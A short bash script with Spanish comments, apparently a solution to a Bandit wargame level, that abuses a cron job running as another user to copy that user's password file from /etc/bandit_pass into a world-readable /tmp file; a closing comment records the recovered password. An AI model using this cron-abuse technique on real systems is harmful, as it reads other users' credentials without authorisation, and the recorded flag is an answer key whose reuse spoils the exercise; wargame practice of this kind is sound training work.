#!/bin/bash
# Script para abuso de cron

# se supone que este script debe hacerse una copia en /var/spool/bandit24/foo/
# y se debe dar permisos de ejecución a bandit24

echo "I am user bandit24"
echo "And I am abusing cron"

cat /etc/bandit_pass/bandit24 > /tmp/tmp.Zt9EzGMmqn/bandit24_pass.log

# se debe dar permisos de lectura a bandit24 en el archivo bandit24_pass.log
chmod o+r /tmp/tmp.Zt9EzGMmqn/bandit24_pass.log


# despues de eso hacer la copia y tirar un watch -n 1 ls -l
# la clave resultante gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
